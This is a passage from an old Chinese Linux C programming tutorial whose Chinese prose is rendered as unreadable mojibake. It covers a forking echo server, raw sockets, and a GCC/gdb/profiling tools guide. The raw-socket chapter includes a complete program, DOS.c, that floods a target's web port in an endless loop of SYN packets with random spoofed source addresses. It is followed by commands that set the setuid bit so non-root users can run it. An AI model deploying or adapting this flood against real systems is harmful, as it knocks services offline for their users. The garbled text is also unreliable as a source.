if((listen_fd=socket(AF_INET,SOCK_STREAM,0))<0) 
{ 
printf("Socket Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
bzero(&client_addr,sizeof(struct sockaddr_in)); 
client_addr.sin_family=AF_INET; 
client_addr.sin_port=htons(MY_PORT); 
client_addr.sin_addr.s_addr=htonl(INADDR_ANY); 
n=1; 
/* �����������ֹ��,���������Եڶ��ο������������õȴ�һ��ʱ�� */ 
setsockopt(listen_fd,SOL_SOCKET,SO_REUSEADDR,&n,sizeof(int)); 
if(bind(listen_fd,(struct sockaddr *)&client_addr,sizeof(client_addr))<0) 
{ 
printf("Bind Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
listen(listen_fd,5); 
while(1) 
{ 
accept_fd=accept(listen_fd,NULL,NULL); 
if((accept_fd<0)&&(errno==EINTR)) 
continue; 
else if(accept_fd<0) 
{ 
printf("Accept Error:%s\n\a",strerror(errno)); 
continue; 
} 
if((n=fork())==0) 
{ 
/* �ӽ��̴���ͻ��˵����� */ 
char buffer[1024]; 
close(listen_fd); 
n=read(accept_fd,buffer,1024); 
write(accept_fd,buffer,n); 
close(accept_fd); 
exit(0); 
} 
else if(n<0) 
printf("Fork Error:%s\n\a",strerror(errno)); 
close(accept_fd); 
} 
} 
�����������ǰ��д�ͻ��˳����������ų���,����������telnet���� 
-- 

������(10) 

10. ԭʼ�׽��� 
������ǰ���Ѿ�ѧϰ�����������������׽���(SOCK_STREAM,SOCK_DRAGM).����һ�� 
��������һ����ѧϰ����һ���׽���--ԭʼ�׽���(SOCK_RAW). Ӧ��ԭʼ�׽���,���ǿ� 
�Ա�д����TCP��UDP�׽��ֲ��ܹ�ʵ�ֵĹ���. ע��ԭʼ�׽���ֻ�ܹ�����rootȨ�޵� 
�˴���. 
10.1 ԭʼ�׽��ֵĴ��� 
int sockfd(AF_INET,SOCK_RAW,protocol) 
���Դ���һ��ԭʼ�׽���.����Э������Ͳ�ͬ���ǿ��Դ�����ͬ���͵�ԭʼ�׽��� �� 
��:IPPROTO_ICMP,IPPROTO_TCP,IPPROTO_UDP�ȵ�.��ϸ������鿴 <netinet/in.h> �� 
��������һ��ʵ����˵��ԭʼ�׽��ֵĴ�����ʹ�� 
10.2 һ��ԭʼ�׽��ֵ�ʵ�� 
���ǵ�DOS��ʲô��˼��?���������Ǿ�һ������дһ��ʵ��DOS��С����. �����ǳ���� 
Դ���� 
/******************** DOS.c *****************/ 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <stdlib.h> 
#include <errno.h> 
#include <unistd.h> 
#include <stdio.h> 
#include <netdb.h> 
#define DESTPORT 80 /* Ҫ�����Ķ˿�(WEB) */ 
#define LOCALPORT 8888 
void send_tcp(int sockfd,struct sockaddr_in *addr); 
unsigned short check_sum(unsigned short *addr,int len); 
int main(int argc,char **argv) 
{ 
int sockfd; 
struct sockaddr_in addr; 
struct hostent *host; 
int on=1; 
if(argc!=2) 
{ 
fprintf(stderr,"Usage:%s hostname\n\a",argv[0]); 
exit(1); 
} 
bzero(&addr,sizeof(struct sockaddr_in)); 
addr.sin_family=AF_INET; 
addr.sin_port=htons(DESTPORT); 
if(inet_aton(argv[1],&addr.sin_addr)==0) 
{ 
host=gethostbyname(argv[1]); 
if(host==NULL) 
{ 
fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno)); 
exit(1); 
} 
addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]); 
} 
/**** ʹ��IPPROTO_TCP����һ��TCP��ԭʼ�׽��� ****/ 
sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP); 
if(sockfd<0) 
{ 
fprintf(stderr,"Socket Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
/******** ����IP���ݰ���ʽ,����ϵͳ�ں�ģ��IP���ݰ��������Լ�����д ***/ 
setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)); 
/**** û�а취,ֻ�ó������û��ſ���ʹ��ԭʼ�׽��� *********/ 
setuid(getpid()); 
/********* ����ը����!!!! ****/ 
send_tcp(sockfd,&addr); 
} 
/******* ����ը����ʵ�� *********/ 
void send_tcp(int sockfd,struct sockaddr_in *addr) 
{ 
char buffer[100]; /**** �����������ǵ����ݰ� ****/ 
struct ip *ip; 
struct tcphdr *tcp; 
int head_len; 
/******* ���ǵ����ݰ�ʵ����û���κ�����,���Գ��Ⱦ��������ṹ�ĳ��� ***/ 
head_len=sizeof(struct ip)+sizeof(struct tcphdr); 
bzero(buffer,100); 
/******** ���IP���ݰ���ͷ��,���ǵ�IP��ͷ��ʽ��? ******/ 
ip=(struct ip *)buffer; 
ip->ip_v=IPVERSION; /** �汾һ����� 4 **/ 
ip->ip_hl=sizeof(struct ip)>>2; /** IP���ݰ���ͷ������ **/ 
ip->ip_tos=0; /** �������� **/ 
ip->ip_len=htons(head_len); /** IP���ݰ��ĳ��� **/ 
ip->ip_id=0; /** ��ϵͳȥ��д�� **/ 
ip->ip_off=0; /** ������һ��,ʡ��ʱ�� **/ 
ip->ip_ttl=MAXTTL; /** ���ʱ�� 255 **/ 
ip->ip_p=IPPROTO_TCP; /** ����Ҫ������ TCP�� **/ 
ip->ip_sum=0; /** У�����ϵͳȥ�� **/ 
ip->ip_dst=addr->sin_addr; /** ���ǹ����Ķ��� **/ 
/******* ��ʼ��дTCP���ݰ� *****/ 
tcp=(struct tcphdr *)(buffer +sizeof(struct ip)); 
tcp->source=htons(LOCALPORT); 
tcp->dest=addr->sin_port; /** Ŀ�Ķ˿� **/ 
tcp->seq=random(); 
tcp->ack_seq=0; 
tcp->doff=5; 
tcp->syn=1; /** ��Ҫ�������� **/ 
tcp->check=0; 
/** ����,һ�ж�׼������.������,��׼������û��?? ^_^ **/ 
while(1) 
{ 
/** �㲻֪�����Ǵ���������,������ȥ�Ȱ�! **/ 
ip->ip_src.s_addr=random(); 
/** ʲô����ϵͳ����,Ҳû�ж�����˼,�����������Լ���У��ͷ���� */ 
/** �����������п��� */ 
tcp->check=check_sum((unsigned short *)tcp, 
sizeof(struct tcphdr)); 
sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in)); 
} 
} 
/* �������ײ�У��͵��㷨,͵�˱��˵� */ 
unsigned short check_sum(unsigned short *addr,int len) 
{ 
register int nleft=len; 
register int sum=0; 
register short *w=addr; 
short answer=0; 
while(nleft>1) 
{ 
sum+=*w++; 
nleft-=2; 
} 
if(nleft==1) 
{ 
*(unsigned char *)(&answer)=*(unsigned char *)w; 
sum+=answer; 
} 
sum=(sum>>16)+(sum&0xffff); 
sum+=(sum>>16); 
answer=~sum; 
return(answer); 
} 
����һ��,��localhost��һ��ʵ��,������ʲô���.(ǧ��Ҫ�Ա��˵İ�). Ϊ������ 
ͨ�û����������������,����Ӧ�ý��������������߱�Ϊroot,�� ����setuidλ 
[root@hoyt /root]#chown root DOS 
[root@hoyt /root]#chmod +s DOS 
10.3 �ܽ� 
ԭʼ�׽��ֺ�һ����׽��ֲ�ͬ������ǰ�����ϵͳ��������,����Ҫ�������Լ������� 
.. �����������ǲ����кܶ����Ȥ��. �����Ǵ�����һ��TCP�׽��ֵ�ʱ��,����ֻ�Ǹ� 
�������Ҫ���͵�����(buffer)���ݸ���ϵͳ. ϵͳ���յ����ǵ����ݺ�,���Զ��ĵ��� 
��Ӧ��ģ������ݼ���TCPͷ��,Ȼ�����IPͷ��. �ٷ��ͳ�ȥ.�������������Լ������� 
����ͷ��,ϵͳֻ�ǰ����Ƿ��ͳ�ȥ. �������ʵ����,��������Ҫ�޸����ǵ�ԴIP��ַ 
,��������ʹ����setsockopt����,�������ֻ���޸�TCP����,��ôIP����һ��Ҳ������ 
ϵͳ��������. 
-- 

������(11) 

11. ��� 
�������������������̳�.�������Ҳ��д��һ������,ԭ����Ϊд���Ӧ���� 
һ�� ���ѵ���,��������֪��ԭ���кܶ�ĵط������������Ҫ��.�һ��Ѻܶ�Ķ����� 
ʡ�Ե��� ����д������ƪ�̳��Ժ�,�Һ�����������ʶ��������һ��. 
�������ֻ�Ǳ�дһ��� ��������ǱȽ����׵�,�������������д���ȽϺõ��� 
��������ǻ�����ңԶ��·Ҫ��. �������һ�����˵���Ƕ���̼��϶��̵߳�.Ϊ�˴� 
��������ڲ��Ĺ�ϵ,���ǻ�Ҫѧϰ ����֮���ͨ��.������������������������ͻ 
���¼�,Ϊ�����ǻ�Ҫȥѧϰ���߼��� �¼�����֪ʶ.���ڵ���ϢԽ��Խ����,Ϊ�˴��� 
����Щ��Ϣ,���ǻ�Ҫȥѧϰ���ݿ�. ���Ҫ��д�����õĺڿ����,���ǻ�Ҫȥ��Ϥ�� 
������Э��.��֮����Ҫѧ�Ķ������ܶ�ܶ�. 
��һ����������ˮƽ,��һ��ӡ�ȵ����ˮƽ,����̨���ˮƽ,�ٿ�һ�������Լ��� 
���ˮƽ��Ҿͻ�֪����ʲô�������.���������õ�����м����������й����Լ��� 
д��. 
������Ҳ�Ҫ����,���õ���.ֻҪ���ǻ������ѵ�,���ܹ��������Ǻͱ��˵Ĳ��, �� 
�Ǿͻ���ϣ��. �Ͼ��������ڻ�����.ֻҪ����Ŭ��,�����ȥѧϰ,����һ���ܹ�ѧ�õ� 
..���ǾͿ���׷�ϱ���ֱ����������! 
����һ��: 
���˿�������������һ����������,���ҿ��Աȱ������ĸ���! 
�¸ҵ�������,Ϊ������ΰ������������ҵ,Ϊ�������δ��,Ŭ����ȥ�ܶ���!��� 
���ס���ǵ�! 
hoyt 
11.1 �ο����� 
<<ʵ��UNIX���>>---��е��ҵ������. 
<<Linux������>>--�廪��ѧ������. 

9)Linux��C�������߽��� 

Linux�ķ��а��а����˺ܶ������������. �����еĺܶ������� C �� C++Ӧ�ó��򿪷� 
��. ���Ľ������� Linux �������� C Ӧ�ó��򿪷��͵��ԵĹ���. ���ĵ���ּ�ǽ����� 
���� Linux ��ʹ�� C ������������ C ��̹���, ���� C ���Ա�̵Ľ̳�. 

GNU C ������ 
GNU C ������(GCC)��һ��ȫ���ܵ� ANSI C ���ݱ�����. �������Ϥ��������ϵͳ��Ӳ 
��ƽ̨�ϵ�һ�� C ������, �㽫�ܺܿ������ GCC. ���ڽ��������ʹ�� GCC ��һЩ 
GCC ��������õ�ѡ��. 

ʹ�� GCC 
ͨ�����һЩѡ����ļ�����ʹ�� GCC ������. gcc ����Ļ����÷�����: 

gcc [options] [filenames] 
������ѡ��ָ���Ĳ���������������ÿ���������ļ���ִ��. ��һС�ڽ�����һЩ����� 
���õ���ѡ��. 

GCC ѡ�� 
GCC �г���100���ı���ѡ�����. ��Щѡ���е�����������Զ�������õ�, ��һЩ�� 
Ҫ��ѡ���Ƶ���õ�. �ܶ�� GCC ѡ�����һ�����ϵ��ַ�. ��������Ϊÿ��ѡ�� 
ָ�����Ե����ַ�, ���Ҿ������� Linux ����һ���㲻����һ�����������ַ����һ 
��ѡ��. ����, ��������������ǲ�ͬ��: 

gcc -p -g test.c 

gcc -pg test.c 
��һ��������� GCC ���� test.c ʱΪ prof ���������(profile)��Ϣ���Ұѵ����� 
Ϣ���뵽��ִ�е��ļ���. �ڶ�������ֻ���� GCC Ϊ gprof �����������Ϣ. 

���㲻���κ�ѡ�����һ������ʱ, GCC ���Ὠ��(�ٶ�����ɹ�)һ����Ϊ a.out �Ŀ� 
ִ���ļ�. ����, ���������ڵ�ǰĿ¼�²���һ���� a.out ���ļ�: 

gcc test.c 
������ -o ����ѡ����Ϊ�������Ŀ�ִ���ļ�ָ��һ���ļ��������� a.out. ����, ��һ 
���� count.c �� C �������Ϊ���� count �Ŀ�ִ���ļ�, �㽫�������������: 

gcc -o count count.c 

------------------------------------------------------------------------------ 
-- 

ע��: ����ʹ�� -o ѡ��ʱ, -o ��������һ���ļ���. 

------------------------------------------------------------------------------ 
-- 

GCC ͬ����ָ��������������ٵı���ѡ��. -c ѡ����� GCC ����Դ�������ΪĿ��� 
��������������ӵĲ���. ���ѡ��ʹ�õķǳ�Ƶ����Ϊ��ʹ�ñ����� C ����ʱ�� 
�ȸ��첢�Ҹ����ڹ���. ȱʡʱ GCC ������Ŀ������ļ���һ�� .o ����չ��. 

-S ����ѡ����� GCC ��Ϊ C ��������˻�������ļ���ֹͣ����. GCC �����Ļ���� 
���ļ���ȱʡ��չ���� .s . -E ѡ��ָʾ���������������ļ�����Ԥ����. �����ѡ�� 
��ʹ��ʱ, Ԥ��������������͵���׼��������Ǵ������ļ���. 

�� �� ѡ �� 
������ GCC ���� C ����ʱ, �������������ٵ�ʱ����ɱ��벢��ʹ�����Ĵ������ڵ� 
��. ���ڵ�����ζ�ű����Ĵ�����Դ������ͬ����ִ�д���, �����Ĵ���û�о����� 
��. �кܶ�ѡ������ڸ��� GCC �ںķѸ������ʱ��������׵����ԵĻ����ϲ�����С 
����Ŀ�ִ���ļ�. ��Щѡ��������͵���-O �� -O2 ѡ��. 

-O ѡ����� GCC ��Դ������л����Ż�. ��Щ�Ż��ڴ��������¶���ʹ����ִ�еĸ� 
��. -O2 ѡ����� GCC ����������С�;����ܿ�Ĵ���. -O2 ѡ�ʹ������ٶȱ�ʹ 
�� -O ʱ��. ��ͨ�������Ĵ���ִ���ٶȻ����. 

���� -O �� -O2 �Ż�ѡ����, ����һЩ�ͼ�ѡ�����ڲ�������Ĵ���. ��Щѡ��ǳ��� 
����, �������ֻ�е�����ȫ�����Щѡ���Ա����Ĵ������ʲô����Ч��ʱ��ȥ 
ʹ��. ��Щѡ�����ϸ����, ��ο� GCC ��ָ��ҳ, ���������ϼ��� man gcc . 

���Ժ�����ѡ�� 
GCC ֧�����ֵ��Ժ�����ѡ��. ����Щѡ���������õ����� -g �� -pg ѡ��. 
-g ѡ����� GCC �����ܱ� GNU ������ʹ�õĵ�����Ϣ�Ա������ĳ���. GCC �ṩ�� 
һ���ܶ����� C ��������û�е�����, �� GCC ������ʹ -g �� -O (�����Ż�����)���� 
.. ��һ��ǳ�������Ϊ�����������ղ�Ʒ���������������µ�����Ĵ���. ����ͬʱʹ 
��������ѡ��ʱ������������д��ĳЩ�����Ѿ����Ż�ʱ�� GCC ���˸Ķ�. ���ڵ��� 
C ����ĸ�����Ϣ�뿴��һ��"�� gdb ���� C ����" . 
-pg ѡ����� GCC ����ĳ�����������Ĵ���, ִ��ʱ, ���� gprof �õ�������Ϣ�� 
��ʾ��ĳ���ĺ�ʱ���. ���� gprof �ĸ�����Ϣ��ο� "gprof" һ��. 

�� gdb ���� GCC ���� 
Linux ������һ���� gdb �� GNU ���Գ���. gdb ��һ���������� C �� C++ �����ǿ�� 
������. ��ʹ�����ڳ�������ʱ�۲������ڲ��ṹ���ڴ��ʹ�����. ������ gdb �� 
�ṩ��һЩ����: 

��ʹ���ܼ���������б�����ֵ. 
��ʹ�������öϵ���ʹ������ָ���Ĵ�������ִֹͣ��. 
��ʹ����һ���е�ִ����Ĵ���. 

���������ϼ��� gdb �����س����Ϳ������� gdb ��, ���һ�������Ļ�, gdb �������� 
�����㽫����Ļ�Ͽ������Ƶ�����: 

GNU gdb 5.0 
Copyright 2000 Free Software Foundation, Inc. 
GDB is free software, covered by the GNU General Public License, and you are 
welcome to change it and/or distribute copies of it under certain conditions. 
Type "show copying" to see the conditions. 
There is absolutely no warranty for GDB. Type "show warranty" for details. 
This GDB was configured as "i386-redhat-linux". 
(gdb) 
�������� gdb ��, ��������������ָ���ܶ��ѡ��. ��Ҳ����������ķ�ʽ������ gdb 
: 

gdb <fname> 
���������ַ�ʽ���� gdb , ����ֱ��ָ����Ҫ���Եĳ���. �⽫����gdb װ����Ϊ 
fname �Ŀ�ִ���ļ�. ��Ҳ������ gdb ȥ���һ��������쳣��ֹ�������� core �ļ�, 
������һ���������еĳ�������. ����Բο� gdb ָ��ҳ�����������ϼ��� gdb -h �� 
��һ���й���Щѡ���˵���ļ��б�. 

Ϊ���Ա������(Compiling Code for Debugging) 
Ϊ��ʹ gdb ��������, �����ʹ��ĳ����ڱ���ʱ����������Ϣ. ������Ϣ��������� 
���ÿ�����������ͺ��ڿ�ִ���ļ���ĵ�ַӳ���Լ�Դ������к�. gdb ������Щ�� 
ϢʹԴ����ͻ����������. 

�ڱ���ʱ�� -g ѡ��򿪵���ѡ��. 

gdb �������� 
gdb ֧�ֺܶ������ʹ����ʵ�ֲ�ͬ�Ĺ���. ��Щ����Ӽ򵥵��ļ�װ�뵽���������� 
���õĶ�ջ���ݵĸ�������, ��27.1�г��������� gdb ����ʱ���õ���һЩ����. ���� 
�� gdb ����ϸʹ����ο� gdb ��ָ��ҳ. 

���� gdb ����. 

�� �� �� �� 
file װ����Ҫ���ԵĿ�ִ���ļ�. 
kill ��ֹ���ڵ��Եĳ���. 
list �г�����ִ���ļ���Դ�����һ����. 
next ִ��һ��Դ���뵫�����뺯���ڲ�. 
step ִ��һ��Դ������ҽ��뺯���ڲ�. 
run ִ�е�ǰ�����Եĳ��� 
quit ��ֹ gdb 
watch ʹ���ܼ���һ��������ֵ����������ʱ���ı�. 
print ��ʾ���ʽ��ֵ 
break �ڴ��������öϵ�, �⽫ʹ����ִ�е�����ʱ������. 
make ʹ���ܲ��˳� gdb �Ϳ������²�����ִ���ļ�. 
shell ʹ���ܲ��뿪 gdb ��ִ�� UNIX shell ����. 

gdb ֧�ֺܶ��� UNIX shell ����һ��������༭����. �������� bash �� tcsh������ 
�� Tab ���� gdb ���㲹��һ��Ψһ������, �����Ψһ�Ļ� gdb ���г�����ƥ����� 
��. ��Ҳ���ù������·�����ʷ����. 

gdb Ӧ�þ��� 
������һ��ʵ������һ�������� gdb ���Գ���. �����Եĳ����൱�ļ�, ����չʾ�� 
gdb �ĵ���Ӧ��. 

�����г��˽������Եĳ���. ������򱻳�Ϊ hello , ����ʾһ���򵥵��ʺ�, ���÷� 
�����г�. 

#include <stdio.h> 

static void my_print (char *); 
static void my_print2 (char *); 

main () 
{ 
char my_string[] = "hello world!"; 
my_print (my_string); 
my_print2 (my_string); 
} 

void my_print (char *string) 
{ 
printf ("The string is %s ", string); 
} 

void my_print2 (char *string) 
{ 
char *string2; 
int size, i; 

size = strlen (string); 
string2 = (char *) malloc (size + 1); 
for (i = 0; i < size; i++) 
string2[size - i] = string[i]; 
string2[size+1] = ''; 

printf ("The string printed backward is %s ", string2); 
} 
����������������: 

gcc -g -o hello hello.c 
�������ִ��ʱ��ʾ���½��: 
../hello 
The string is hello world! 

The string printed backward is 
����ĵ�һ������ȷ��, ���ڶ��д�ӡ���Ķ���������������������. �������������� 
Ӧ����: 

The string printed backward is !dlrow olleh 
����ĳЩԭ��, my_print2 ����û����������. �������� gdb �������⾿�������Ķ�, 
�ȼ�����������: 

gdb hello 

------------------------------------------------------------------------------ 
-- 

ע��: �ǵ��ڱ��� hello ����ʱ�ѵ���ѡ���. 

------------------------------------------------------------------------------ 
-- 

���������������ʱ���˰�Ҫ���Եĳ�����Ϊ�������� gdb , ������� gdb ��ʾ������ 
file ������������: 

(gdb) file hello 
���������� hello ��ִ���ļ��������� gdb ��������װ����һ��. 

��ʱ������ gdb �� run ���������� hello ��. ������ gdb �ﱻ���к�����Լ������ 
��: 

(gdb) run 

Starting program: /root/hello 

The string is hello world! 

The string printed backward is 

Program exited with code 040 
���������� gdb �������еĽ��һ��. ������, Ϊʲô�����ӡû�й���? Ϊ���ҳ� 
֢������, ���ǿ����� my_print2 ������ for ������һ���ϵ�, ������������� gdb 
��ʾ���¼��� list ��������, �г�Դ����: 

(gdb) list 

(gdb) list 

(gdb) list 

------------------------------------------------------------------------------ 
-- 

����: �� gdb ��ʾ���°��س������ظ���һ������. 

------------------------------------------------------------------------------ 
-- 

��һ�μ��� list ������������: 

1 #include <stdio.h> 
2 
3 static void my_print (char *); 
4 static void my_print2 (char *); 
5 
6 main () 
7 { 
8 char my_string[] = "hello world!"; 
9 my_print (my_string); 
10 my_print2 (my_string); 

������»س�, gdb ����ִ��һ�� list ����, �����������: 

11 } 
12 
13 void my_print (char *string) 
14 { 
15 printf ("The string is %s ", string); 
16 } 
17 
18 void my_print2 (char *string) 
19 { 
20 char *string2; 
�ٰ�һ�λس����г� hello �����ʣ�ಿ��: 

21 int size, i; 
22 
23 size = strlen (string); 
24 string2 = (char *) malloc (size + 1); 
25 for (i = 0; i < size; i++) 
26 string2[size - i] = string[i]; 
27 string2[size+1] = ''; 
28 
29 printf ("The string printed backward is %s ", string2); 
30 } 
�����г���Դ����, ���ܿ���Ҫ��ϵ�ĵط��ڵ�26��, �� gdb ��������ʾ���¼����� 
���������öϵ�: 

(gdb) break 26 
gdb ���������µ���Ӧ: 

Breakpoint 1 at 0x804857c: file hello.c, line 26. 

(gdb) 

�����ټ��� run ����, ���������µ����: 

Starting program: /root/hello 

The string is hello world! 

Breakpoint 1, my_print2 (string=0xbffffab0 "hello world!") at hello.c:26 
26 string2[size - i] = string[i]; 
����ͨ������һ���۲� string2[size - i] ������ֵ�Ĺ۲������������������������, 
�����Ǽ���: 

(gdb) watch string2[size - i] 
gdb ���������»�Ӧ: 

Hardware watchpoint 2: string2[size - i] 
���ڿ����� next ������һ������ִ�� for ѭ����: 

(gdb) next 
������һ��ѭ����, gdb �������� string2[size - i] ��ֵ�� `h`. gdb �����µ���ʾ 
�������������Ϣ: 

Hardware watchpoint 2: string2[size - i] 

Old value = 0 '00' 
New value = 104 'h' 
my_print2 (string=0xbffffab0 "hello world!") at hello.c:25 
25 for (i = 0; i < size; i++) 
���ֵ����������. ����������ѭ���Ľ��������ȷ��. �� i=11 ʱ, ���ʽ 
string2[size - i] ��ֵ���� `!`, size - i ��ֵ���� 1, ���һ���ַ��Ѿ������´� 
����. 

������ٰ�ѭ��ִ����ȥ, ��ῴ���Ѿ�û��ֵ����� string2[0] ��, �������´��� 
��һ���ַ�, ��Ϊ malloc �����ڷ����ڴ�ʱ�����ǳ�ʼ��Ϊ��(null)�ַ�. ���� 
string2 �ĵ�һ���ַ��ǿ��ַ�. �������Ϊʲô�ڴ�ӡ string2 ʱû���κ������. 

�����ҳ��������������, ������������Ǻ����׵�. ��ðѴ�����д�� string2 �ĵ� 
һ���ַ��ĵ�ƫ������Ϊ size - 1 ������ size. ������Ϊ string2 �Ĵ�СΪ 12, �� 
��ʼƫ������ 0, ���ڵ��ַ���ƫ���� 0 �� ƫ���� 10, ƫ���� 11 Ϊ���ַ�����. 

���������ǳ���. �������ֽ���취�Ĵ���: 

#include <stdio.h> 

static void my_print (char *); 
static void my_print2 (char *); 

main () 
{ 
char my_string[] = "hello world!"; 
my_print (my_string); 
my_print2 (my_string); 
} 

void my_print (char *string) 
{ 
printf ("The string is %s ", string); 
} 

void my_print2 (char *string) 
{ 
char *string2; 
int size, i; 

size = strlen (string); 
string2 = (char *) malloc (size + 1); 
for (i = 0; i < size; i++) 
string2[size -1 - i] = string[i]; 
string2[size] = ''; 

printf ("The string printed backward is %s ", string2); 
} 
������������core�ļ���������gdb hello core�������鿴�����ںδ��������ں��� 
my_print2()�У���������˸�string2�����ڴ� string2 = (char *) malloc (size + 
1);���ܿ��ܾͻ�core dump. 

����� C ��̹��� 

xxgdb 
xxgdb �� gdb ��һ������ X Window ϵͳ��ͼ�ν���. xxgdb �����������а�� gdb 
�ϵ���������. xxgdb ʹ����ͨ������ť��ִ�г��õ�����. �����˶ϵ�ĵط�Ҳ��ͼ 
������ʾ. 

������һ�� Xterm ��������������������������: 

xxgdb 
������ gdb ���κ���Ч��������ѡ������ʼ�� xxgdb . ���� xxgdb Ҳ��һЩ���е��� 
����ѡ��, �� 27.2 �г�����Щѡ��. 

�� 27.2. xxgdb ������ѡ��. 

ѡ �� �� �� 
db_name ָ�����õ�����������, ȱʡ�� gdb. 
db_prompt ָ����������ʾ��, ȱʡΪ gdb. 
gdbinit ָ����ʼ�� gdb �������ļ����ļ���, ȱʡΪ .gdbinit. 

nx ���� xxgdb ��ִ�� .gdbinit �ļ�. 
bigicon ʹ�ô�ͼ��. 

calls 
������� sunsite.unc.edu FTP վ���������·��: 
/pub/Linux/devel/lang/c/calls.tar.Z 
��ȡ�� calls , һЩ�ɰ汾�� Linux CD-ROM ���а���Ҳ������. ��Ϊ����һ�����õ� 
����, ����������Ҳ����һ��. �����������õĻ�, �� BBS, FTP, ����һ��CD-ROM �� 
Ūһ������. calls ���� GCC ��Ԥ�����������������Դ�����ļ�, Ȼ�������Щ�ļ� 
����ĺ���������ͼ. 

ע��: �����ϵͳ�ϰ�װ calls , �Գ����û���ݵ�¼��ִ������Ĳ���: 1. ��ѹ�� 
untar �ļ�. 2. cd ���� calls untar ��������Ŀ¼. 3. ������ calls ���ļ��ƶ� 
�� /usr/bin Ŀ¼. 4. ������ calls.1 ���ļ��ƶ���Ŀ¼ /usr/man/man1 . 5. ɾ�� 
/tmp/calls Ŀ¼. ��Щ���轫�� calls ���������ָ��ҳ��װ�����ϵͳ��. 

------------------------------------------------------------------------------ 
-- 

�� calls ��ӡ�����ø��ٽ��ʱ, ���ں��������������Ÿ����˺��������ļ����ļ���: 

main [hello.c] 
��������������� calls �������ļ����, calls ��֪�������õĺ�����������, ��ֻ 
��ʾ����������: 

printf 
calls ���Եݹ�;�̬�������. �ݹ麯����ʾ�����������: 

fact <<< recursive in factorial.c >>> 
��̬������������ʾ: 

total [static in calculate.c] 
��Ϊһ������, ������ calls ��������ĳ���: 

#include <stdio.h> 

static void my_print (char *); 
static void my_print2 (char *); 

main () 
{ 
char my_string[] = "hello world!"; 
my_print (my_string); 
my_print2 (my_string); 
my_print (my_string); 
} 

void count_sum() 
{ 
int i,sum=0; 
for(i=0; i<1000000; i++) 
sum += i; 
} 

void my_print (char *string) 
{ 
count_sum(); 
printf ("The string is %s ", string); 
} 

void my_print2 (char *string) 
{ 
char *string2; 
int size, i,sum =0; 

count_sum(); 
size = strlen (string); 
string2 = (char *) malloc (size + 1); 
for (i = 0; i < size; i++) string2[size -1 - i] = string[i]; 
string2[size] = ''; 
for(i=0; i<5000000; i++) 
sum += i; 

printf ("The string printed backward is %s ", string2); 
} 
���������µ����: 

1 __underflow [hello.c] 
2 main 
3 my_print [hello.c] 
4 count_sum [hello.c] 
5 printf 
6 my_print2 [hello.c] 
7 count_sum 
8 strlen 
9 malloc 
10 printf 
calls �кܶ�������ѡ�������ò�ͬ�������ʽ, �й���Щѡ��ĸ�����Ϣ��ο� calls 
��ָ��ҳ. ���������������ϼ��� calls -h . 

calltree 
calltree��calls���ƣ������������������ͼ�⣬����������ϸ����Ϣ�� 
���Դ�sunsite.unc.edu FTP վ���������·�� 
:/pub/Linux/devel/lang/c/calltree.tar.gz�õ�calltree. 

cproto 
cproto ���� C Դ�����ļ����Զ�Ϊÿ����������ԭ������. �� cproto ������д����ʱ 
Ϊ���ʡ�����������庯��ԭ�͵�ʱ��. 
������� cproto ��������Ĵ���(cproto hello.c): 

#include <stdio.h> 

static void my_print (char *); 
static void my_print2 (char *); 

main () 
{ 
char my_string[] = "hello world!"; 
my_print (my_string); 
my_print2 (my_string); 
} 

void my_print (char *string) 
{ 
printf ("The string is %s ", string); 
} 

void my_print2 (char *string) 
{ 
char *string2; 
int size, i; 

size = strlen (string); 
string2 = (char *) malloc (size + 1); 
for (i = 0; i < size; i++) 
string2[size -1 - i] = string[i]; 
string2[size] = ''; 

printf ("The string printed backward is %s ", string2); 
} 
�㽫�õ���������: 

/* hello.c */ 

int main(void); 

int my_print(char *string); 

int my_print2(char *string); 
�����������ض���һ�����庯��ԭ�͵İ����ļ���. 

indent 
indent ʵ�ó����� Linux ���������һ�����ʵ�ù���. ������߼򵥵�˵��Ϊ��Ĵ� 
��������۵������ĸ�ʽ. indent Ҳ�кܶ�ѡ����ָ����θ�ʽ�����Դ����.��Щѡ�� 
�ĸ�����Ϣ�뿴indent ��ָ��ҳ, ���������ϼ��� indent -h . 

����������� indent ��ȱʡ���: 

���� indent ��ǰ�� C ����: 

#include <stdio.h> 

static void my_print (char *); 
static void my_print2 (char *); 

main () 
{ 
char my_string[] = "hello world!"; 
my_print (my_string); 
my_print2 (my_string); 
} 

void my_print (char *string) 
{ 
printf ("The string is %s ", string); 
} 

void my_print2 (char *string) 
{ 
char *string2; int size, i; 

size = strlen (string); 
string2 = (char *) malloc (size + 1); 
for (i = 0; i < size; i++) string2[size -1 - i] = string[i]; 
string2[size] = ''; 

printf ("The string printed backward is %s ", string2); 
} 
���� indent ��� C ����: 

#include <stdio.h> 
static void my_print (char *); 
static void my_print2 (char *); 
main () 
{ 
char my_string[] = "hello world!"; 
my_print (my_string); 
my_print2 (my_string); 
} 
void 
my_print (char *string) 
{ 
printf ("The string is %s ", string); 
} 
void 
my_print2 (char *string) 
{ 
char *string2; 
int size, i; 
size = strlen (string); 
string2 = (char *) malloc (size + 1); 
for (i = 0; i < size; i++) 
string2[size - 1 - i] = string[i]; 
string2[size] = ''; 
printf ("The string printed backward is %s ", string2); 
} 
indent �����ı�����ʵ������, ��ֻ�Ǹı��������. ʹ����ø��ɶ�, ����Զ�� 
һ������. 

gprof 
gprof �ǰ�װ����� Linux ϵͳ�� /usr/bin Ŀ¼�µ�һ������. ��ʹ����������ĳ� 
��Ӷ�֪���������һ��������ִ��ʱ���ʱ��. 

gprof �������������ÿ�����������õĴ�����ÿ������ִ��ʱ��ռʱ��İٷֱ�. ���� 
���������ĳ������ܵĻ���Щ��Ϣ�ǳ�����. 

Ϊ������ĳ�����ʹ�� gprof, ������ڱ������ʱ���� -pg ѡ��. �⽫ʹ������ÿ�� 
ִ��ʱ����һ���� gmon.out ���ļ�. gprof ������ļ�����������Ϣ. 

������������ĳ��򲢲����� gmon.out �ļ��������������������������Ϣ: 

gprof <program_name> 
���� program_name �ǲ��� gmon.out �ļ��ĳ��������. 

